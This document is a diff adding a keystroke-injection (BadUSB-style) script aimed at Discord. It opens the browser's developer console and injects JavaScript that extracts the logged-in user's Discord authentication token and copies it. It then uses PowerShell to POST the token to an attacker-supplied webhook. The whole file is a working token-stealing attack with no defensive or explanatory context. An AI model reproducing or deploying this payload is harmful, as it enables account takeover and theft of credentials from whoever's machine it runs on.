@@ -1,0 +1,20 @@
+DEFAULT_DELAY 200
+GUI r
+STRING powershell
+ENTER
+STRING Start-Process "https://discord.com/channels/@me"
+ENTER
+CTRL SHIFT j
+CTRL ~
+STRING webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const c of Object.keys(e.c)){try{const m=e.c[c].exports;if(m&&m.default&&m.default.getToken!==undefined){const token=m.default.getToken();if(token.includes(".")){console.log(`${token}`);copy(token);}}}catch{}}}]);
+ENTER
+CTRL w
+GUI r
+STRING powershell
+ENTER
+STRING $token = "
+CTRL v
+STRING "
+ENTER
+STRING Invoke-RestMethod -Uri "(WEBHOOKLINK!!!!)" -Method POST -Headers @{ "Content-Type" = "application/json" } -Body (ConvertTo-Json @{ content = $token })
+ENTER
